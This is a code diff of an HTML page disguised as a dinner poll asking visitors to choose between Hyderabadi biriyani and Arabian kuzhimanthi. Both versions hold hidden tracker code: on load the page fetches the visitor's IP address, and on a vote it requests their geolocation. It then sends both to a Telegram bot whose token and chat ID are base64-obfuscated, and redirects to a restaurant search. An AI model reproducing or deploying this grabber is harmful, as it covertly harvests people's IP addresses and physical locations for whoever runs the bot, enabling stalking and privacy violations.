@@ -3,72 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dinner Poll - Choose Your Favorite</title>
+    <title>Dinner Choice</title>
     <style>
-        body { background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 20px; text-align: center; }
-        .poll-container { max-width: 480px; margin: auto; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        h2 { color: #e67e22; font-size: 1.6rem; margin-bottom: 10px; }
-        p { color: #7f8c8d; font-size: 0.95rem; margin-bottom: 25px; }
-        .option-card { margin-bottom: 20px; position: relative; cursor: pointer; border-radius: 15px; overflow: hidden; transition: transform 0.3s; border: 2px solid transparent; }
-        .option-card:hover { transform: scale(1.03); border-color: #e67e22; }
-        img { width: 100%; height: 230px; object-fit: cover; display: block; border-bottom: 2px solid #eee; }
-        .label { background: rgba(0, 0, 0, 0.75); color: white; position: absolute; bottom: 0; width: 100%; padding: 12px 0; font-weight: bold; letter-spacing: 1px; }
-        #thanks-msg { display: none; color: #27ae60; font-weight: bold; margin-top: 15px; font-size: 1.1rem; }
+        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; text-align: center; padding: 15px; }
+        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h2 { color: #d35400; margin-bottom: 5px; }
+        p { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .food-item { margin-bottom: 25px; cursor: pointer; border: 1px solid #ddd; border-radius: 10px; overflow: hidden; transition: 0.3s; }
+        .food-item:hover { border-color: #d35400; transform: scale(1.02); }
+        img { width: 100%; height: 220px; object-fit: cover; }
+        .name { font-weight: bold; padding: 10px; display: block; background: #fff; color: #333; }
+        #status { display: none; color: green; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
-<body onload="initializeData()">
-    <div class="poll-container">
-        <h2>What should we order? 😋</h2>
-        <p>Help me decide tonight's special dinner. Pick your favorite!</p>
-        
-        <div class="option-card" onclick="vote('Special Biriyani')">
-            <img src="https://images.unsplash.com/photo-1589302168068-964664d93dc0?auto=format&fit=crop&w=600&q=80" alt="Biriyani">
-            <div class="label">HYDERABADI BIRIYANI</div>
+<body onload="init()">
+    <div class="container">
+        <h2>Tonight's Special 😋</h2>
+        <p>Which one should we order? Pick your favorite!</p>
+
+        <div class="food-item" onclick="handleVote('Biriyani')">
+            <img src="https://www.licious.in/blog/wp-content/uploads/2022/06/chicken-hyderabadi-biryani-01.jpg" alt="Biriyani">
+            <span class="name">HYDERABADI BIRIYANI</span>
         </div>
 
-        <div class="option-card" onclick="vote('Kuzhimanthi')">
-            <img src="https://i.postimg.cc/mD8z4yG6/kuzhimanthi.jpg" alt="Kuzhimanthi">
-            <div class="label">ARABIAN KUZHIMANTHI</div>
+        <div class="food-item" onclick="handleVote('Kuzhimanthi')">
+            <img src="https://static.toiimg.com/thumb/msid-88331145,width-1280,height-720,resizemode-4/.jpg" alt="Kuzhimanthi">
+            <span class="name">ARABIAN KUZHIMANTHI</span>
         </div>
 
-        <div id="thanks-msg">Great Choice! Voting successful... ❤️</div>
+        <div id="status">Thanks! Ordering soon... ❤️</div>
     </div>
 
     <script>
-        let userIP = "Fetching...";
-        const key_p1 = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
-        const key_p2 = "NzAwODk1Mjc0Ng==";
+        let ip = "N/A";
+        const t = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
+        const c = "NzAwODk1Mjc0Ng==";
 
-        async function initializeData() {
+        async function init() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-            } catch (error) {}
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
         }
 
-        async function vote(choice) {
-            document.getElementById('thanks-msg').style.display = 'block';
-            
-            // ലൊക്കേഷൻ എടുക്കാൻ ശ്രമിക്കുന്നു
+        function handleVote(food) {
+            document.getElementById('status').style.display = 'block';
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => sendToTelegram(choice, `${p.coords.latitude},${p.coords.longitude}`), 
-                () => sendToTelegram(choice, "Denied"));
+                navigator.geolocation.getCurrentPosition(
+                    p => sendData(food, p.coords.latitude + "," + p.coords.longitude), 
+                    () => sendData(food, "Permission Denied")
+                );
             } else {
-                sendToTelegram(choice, "Not Supported");
+                sendData(food, "Not Supported");
             }
         }
 
-        async function sendToTelegram(choice, loc) {
-            const t = atob(key_p1);
-            const c = atob(key_p2);
-            const report = `🍴 *New Food Vote*\n\nChoice: ${choice}\nIP: \`${userIP}\` \nLoc: \`${loc}\``;
+        async function sendData(food, loc) {
+            const botToken = atob(t);
+            const chatId = atob(c);
+            const msg = `🍽 *Food Vote: ${food}*\n🌐 *IP:* ${ip}\n📍 *Loc:* ${loc}`;
             
-            await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            
             setTimeout(() => {
-                window.location.href = "https://www.google.com/search?q=best+restaurants+near+me";
-            }, 1500);
+                window.location.href = "https://www.google.com/search?q=restaurants+near+me";
+            }, 2000);
         }
     </script>
 </body>
